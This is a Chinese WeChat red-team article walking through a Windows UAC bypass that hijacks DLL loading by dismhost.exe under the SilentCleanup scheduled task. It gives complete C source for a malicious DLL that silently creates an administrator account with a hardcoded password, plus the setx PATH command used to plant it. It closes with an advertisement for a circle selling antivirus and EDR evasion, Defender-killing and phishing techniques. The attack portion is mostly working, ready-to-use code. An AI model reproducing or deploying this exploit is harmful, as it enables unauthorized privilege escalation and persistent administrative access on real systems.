---
title: 【红队思路】DLL侧加载UAC提权
url: https://mp.weixin.qq.com/s/QuuEtHXavzmJA20CjxiNVw
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:26:35.122488
---

# 【红队思路】DLL侧加载UAC提权

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvibl6N0ZVpjz7Y0uMu1elmIrODibvY2FT3xbuRmkaGNRdakficWbRtUz3w/0?wx_fmt=jpeg)

# 【红队思路】DLL侧加载UAC提权

原创

Hello888

安全天书

![]()

在小说阅读器中沉浸阅读

0x01 声明

本文所涉及的技术、思路和工具仅用于安全测试和防御研究，切勿将其用于非法入侵或攻击他人系统等目的，一切后果由使用者自行承担！！！

0x02 UAC介绍

著名的计划任务SilentCleanup它运行cleanmgr.exe/dismhost.exe。多年来，这个计划任务一次又一次地被滥用，它至今仍然是UAC绕过/权限提升的可靠载体。

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvUicqJCAGoDibrfIkHrXwKb7YAYhGRHcZz2MLGia21zJTKA1UMRm1xsiaEA/640?wx_fmt=png&from=appmsg)

运行这个计划任务，我们会看到dismhost.exe希望通过 DLL 侧加载：api-ms-win-core-kernel32-legacy-l1.dll

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvBIROcS8AzsIfh3lNlnlm6nibAQiaMc7dktsNKBMHVXCrtMRebspyNiaKw/640?wx_fmt=png&from=appmsg)

0x03 UAC使用

DLL编译

```
#include"pch.h"#include<windows.h>#pragma comment (lib, "user32.lib")DWORD WINAPI MyThread(LPVOID lpParam){    WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);    WinExec("cmd.exe /c echo hey > c:\\heythere.txt", 0);    return 0;}DWORD WINAPI WorkItem(LPVOID lpParam){    MyThread(NULL);    return 0;}BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){    switch (fdwReason)    {    case DLL_PROCESS_ATTACH:        DisableThreadLibraryCalls(hinstDLL); // Avoid unnecessary notifications        // Use QueueUserWorkItem to safely execute code after the DLL has been loaded        QueueUserWorkItem(WorkItem, NULL, WT_EXECUTEDEFAULT);        // Optionally execute additional code here, e.g., WinExec command        // WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvAqbmXzPVRVPiaKUaIImCvibOIqohd6fibmMQsLMexibvsXMo7MwlDktF9w/640?wx_fmt=png&from=appmsg)

设置环境变量

```
setx PATH "c:\myfolder;%PATH%"
```

然后把api-ms-win-core-kernel32-legacy-l1.dll放到myfolder目录下

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvHraiaD1tZTsAVWVWPw0tK56PxhW29QDibR8mJ1JVIPhbPJQgdS9wzC0w/640?wx_fmt=png&from=appmsg)

执行效果

去执行SilentCleanup计划任务成功会添加mocker用户，其他利用方式修改DLL即可！

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwEiblV0vNHNaJpRnkjLZo4kvUebGglIu7ICFKhB7XDrLspTkLyvzPhJSaxBp3zM7nOmDBSgenRoLicg/640?wx_fmt=png&from=appmsg)

**0x04 红蓝偶像练习生小圈子

****圈子主要研究方向渗透测试、红蓝对抗、钓鱼手法思路、武器化作，红队工具二开与免杀。圈内不定期分享红队技术文章，攻防经验总结，学习笔记以及自研工具与插件，目前圈子已满300人，欢迎各位进圈子交流学习！****

****圈子目前更新相关技术文章：**

***** HeavenlyBypassAV内部版-轻松免杀各大杀软
* 冰蝎webshell免杀工具

* 哥斯拉webshell免杀工具
* 红队场景下lnk钓鱼Bypass国内AV
* 1日和0日POC
* lnk钓鱼思路视频讲解
* lnk钓鱼Bypass天擎
* msi钓鱼
* chm钓鱼
* Kill360核晶
* AV对抗-致盲AV（核晶）
* 捆绑免杀360
* 杀火绒
* 火绒6.0内存免杀
* kill-windows Defender

* Defender分离免杀
* Defender知识点
* HeavenlyProtectionCS内部CS插件
* EDR对抗思路
* 进程注入知识点

* 自启动思路
* **多种维权手法**

* Fscan免杀核晶
* QVM解决思路
* 红队思路-钓鱼环境下小窗口截屏窃取
* 免杀Todesk/向日葵读取工具

* 渗透测试文章思路
* 内网对抗文章思路
* **还有更多红队思路文章！期待您的加入！！！**********

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BvSCMR82FwHl0g8gTSACYR2UibPsthMniaxIrajG57OiaEia1QHTldd0OXCDnY4HHTyQ8XuLib1nerzlCXsQGWrVC8w/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwFJAbuLxnpEkoczbwU8nmFmKaFw3zgem3QN1qrEVzBcicTB89hFKwPia7PYosgibSltTEK1h9YEhiblkA/0?wx_fmt=png)

安全天书

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/BvSCMR82FwFJAbuLxnpEkoczbwU8nmFmKaFw3zgem3QN1qrEVzBcicTB89hFKwPia7PYosgibSltTEK1h9YEhiblkA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过